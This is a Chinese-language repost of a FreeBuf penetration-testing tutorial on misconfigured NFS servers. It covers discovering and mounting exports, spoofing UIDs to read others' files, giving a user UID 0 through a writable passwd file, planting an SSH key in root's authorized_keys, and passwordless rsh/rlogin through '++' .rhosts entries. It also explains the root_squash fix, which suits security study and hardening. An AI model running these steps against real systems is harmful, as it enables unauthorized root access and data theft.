---
title: nfs-penetration-test
date: 2021-03-06 13:00:00
tags: 'test'
categories:
  - ['开发', 'test']
permalink: nfs-penetration-test
---

https://www.freebuf.com/articles/network/159468.html

针对 NFS 的渗透测试

2018-01-12 13:00:41

**NFS(Network File System) 即网络文件系统, 是 FreeBSD 支持的文件系统中的一种, 它允许网络中的计算机之间通过 TCP/IP 网络共享资源. 在 NFS 的应用中, 本地 NFS 的客户端应用可以透明地读写位于远端 NFS 服务器上的文件, 就像访问本地文件一样. 如今 NFS 具备了防止被利用导出文件夹的功能, 但遗留系统中的 NFS 服务配置不当, 则仍可能遭到恶意攻击者的利用.**

## 发现 NFS 服务

NFS 服务的默认开放端口为 2049/TCP, 因此我们可以借助 Nmap 来针对性的进行探测.

```
2049/tcp open nfs 2-4 (RPC #100003)
```

! [针对 NFS 的渗透测试](https://image.3001.net/images/20180107/15153080932336.png! small)

此外, 我们也可以通过 rpcinfo 命令来确定主机上是否运行或挂载了 NFS 服务.

```
rpcinfo -p IP
```

## ! [针对 NFS 的渗透测试](https://image.3001.net/images/20180107/15153081455473.png! small)

## 显示导出文件夹列表

以下命令将会检索给定主机的导出文件夹列表, 这些信息将被用于访问这些文件夹.

```
showmount -e IP
```

! [针对 NFS 的渗透测试](https://image.3001.net/images/20180107/15153081643724.png! small)

当 showmount 命令与以下参数一起使用时, 可以为我们检索到更多的信息, 例如:

> *   挂载点
> *   连接的主机
> *   目录

```
showmount IP // 连接的主机
showmount -d IP // 目录
showmount -a IP // 挂载点
```

! [针对 NFS 的渗透测试](https://image.3001.net/images/20180107/15153081833021.png! small)

另外, Metasploit 框架中也有一个模块, 可以用来列出导出文件夹.

```
auxiliary/scanner/nfs/nfsmount
```

! [针对 NFS 的渗透测试](https://image.3001.net/images/20180107/15153082037064.png! small)

在这里我再推荐一个实用的小工具 [NFS Shell](https://github.com/NetDirect/nfsshell), 它可以连接到 NFS 共享并可以帮助我们手动识别一些常见的安全问题. 想要使用它我们首先需要安装以下依赖项:

```
apt-get install libreadline-dev libncurses5-dev
make
gcc -g -o nfsshell mount_clnt.o mount_xdr.o nfs_prot_clnt.o nfs_prot_xdr.o nfsshell.o -L/usr/local/lib -lreadline -lhistory -lncurses
./nfsshell
```

使用以下命令获取导出文件夹列表:

```
nfs> host IP // 连接 NFS 服务
nfs> export // 导出 NFS 列表
```

## ! [针对 NFS 的渗透测试](https://image.3001.net/images/20180107/1515308225117.png! small)

## 访问 NFS 共享

导出的文件夹可以通过创建一个空的本地文件夹, 并将共享挂载到该文件夹来访问, 如下所示:

```
mkdir /temp/
mount -t nfs 192.168.1.172:/ /temp -o nolock
```

! [针对 NFS 的渗透测试](https://image.3001.net/images/20180107/15153082471928.png! small)

当成功验证共享挂载后, 我们可以通过以下命令来列出所有的本地磁盘信息.

```
df -h
```

! [针对 NFS 的渗透测试](https://image.3001.net/images/20180107/15153082796213.png! small)

此时, 我们可以像访问其他文件夹一样轻松的访问共享文件夹.

```
cd /temp/
ls
```

## ! [针对 NFS 的渗透测试](https://image.3001.net/images/20180107/15153082987235.png! small)

## UID 操作

如果对于共享上的文件我们没有读取权限该怎么办? 其实这也很简单, 我们可以伪造文件所有者的 UID 来欺骗 NFS 服务器. 以下展示的是 NFS 文件访问拒绝提示:

! [针对 NFS 的渗透测试](https://image.3001.net/images/20180107/15153083175691.png! small)

首先, 我们通过以下命令来获取文件所有者的 UID(用户 ID) 和 GUID(组 ID).

```
ls -al
```

! [针对 NFS 的渗透测试](https://image.3001.net/images/20180107/15153083398114.png! small)

接着, 我们在本地创建一个新用户, 并将该用户的 UID 和名称修改为与文件所有者相同.

```
useradd <user>
passwd <user>
```

UID 可以在 passwd 文件中更改.

```
vi /etc/passwd
```

 ! [针对 NFS 的渗透测试](https://image.3001.net/images/20180107/15153083743905.png! small)

从挂载的文件夹执行 su 命令, 并使用之前创建的已知密码, 此时当前用户将会被切换到新用户.

```
su <useraccount>
```

! [针对 NFS 的渗透测试](https://image.3001.net/images/20180107/1515308405161.png! small)

由于该文件的 UID 与新用户的 UID 相同, 因此系统会误认为这是文件权限的所有者, 这样我们就可以以一个合法的用户身份来读取文件的内容了.

之所以造成这种问题, 原因在于导出文件夹并未设置 root\_squash 选项.root\_squash 登入 NFS 主机, 使用该共享目录时相当于该目录的拥有者. 但是如果是以 root 身份使用这个共享目录的时候, 那么这个使用者 (root) 的权限将被压缩成为匿名使用者, 即通常他的 UID 与 GID 都会变成 nobody 那个身份, 以防止越权访问.

可以在以下位置启用或禁用 root\_squash 选项:

```
vi /etc/exports
``````
/home 192.168.1.47(root_squash) // Enables Root Squash
/home 192.168.1.47(no_root_squash) // Disables Root Squash
```

如果 passwd 文件具有写入权限, 那么我们可以通过将一些非特权用户的 UID 更改为 0, 使其具有根级别的访问权限. 从下图中可以看到, 我将 service 用户的 UID 修改为了 0, 此时该用户将具备 root 的访问权限.

! [针对 NFS 的渗透测试](https://image.3001.net/images/20180107/15153084618775.png! small)

通过 SSH 连接命令再次与目标服务器建立连接, service 将获取到一个 root 访问权限.

! [针对 NFS 的渗透测试](https://image.3001.net/images/20180108/15153952294516.png! small)

## shell 访问

根据存储在导出文件夹中的文件, 可能可以通过 SSH 或 RSH 和 Rlogin 来获取到 shell 访问权限. 我们着重来关注以下两个文件:

> *   authorized\_keys
> *   rhosts

这两个文件都隐藏在 NFS 文件夹中, 我们可以利用以下命令来确定这些文件的存在.

```
ls -al
```

! [针对 NFS 的渗透测试](https://image.3001.net/images/20180107/15153085166486.png! small)

生成一个 SSH 密钥对并将其公钥添加到授权密钥列表中, 那样我们就可以通过 NFS 服务器上的 SSH 与其建立连接了.

```
cd /root/.ssh/
ssh-keygen -t rsa -b 4096
cp /root/.ssh/id_rsa.pub /temp/root/.ssh/
cat id_rsa.pub >> /temp/root/.ssh/authorized_keys
ssh -i /root/.ssh/id_rsa root@192.168.1.189
```

! [针对 NFS 的渗透测试](https://image.3001.net/images/20180107/15153085466009.png! small)

! [针对 NFS 的渗透测试](https://image.3001.net/images/20180107/15153085704084.png! small)

.rhosts 文件用来配置哪些远程主机或用户可以访问系统上的本地帐户. 如果.rhosts 文件的内容为 ++ 符号, 则说明它允许来自网络上的任何主机和用户的连接.

```
cat .rhosts
++
```

! [针对 NFS 的渗透测试](https://image.3001.net/images/20180107/15153085978296.png! small)

以下命令将允许系统的 root 用户直接连接目标系统, 系统将不会提示密码输入, 因为来自系统的所有用户都将被信任.

```
rsh -l root IP
rlogin -l root IP
```

! [针对 NFS 的渗透测试](https://image.3001.net/images/20180107/15153086237613.png! small)

! [针对 NFS 的渗透测试](https://image.3001.net/images/20180107/1515308649711.png! small)

或者如果.rhosts 的内容不同, 则检查文件将有助于确定哪些主机和用户是可信的, 因此可以在无需密码的情况下进行身份验证.

**\*参考来源: [pentestacademy](https://pentestacademy.wordpress.com/2017/09/20/nfs/), FB 小编 secist 编译, 转载请注明来自 FreeBuf.COM**

本文作者:, 转载请注明来自 [FreeBuf.COM](https://www.freebuf.com)

\# 渗透 \# NFS

被以下专辑收录, 发现更多精彩内容

\+ 收入我的专辑

展开更多

评论 按时间排序

! [](https://image.3001.net/images/index/wp-user-avatar-50x50.png)

请登录 / 注册后在 FreeBuf 发布内容哦

相关推荐
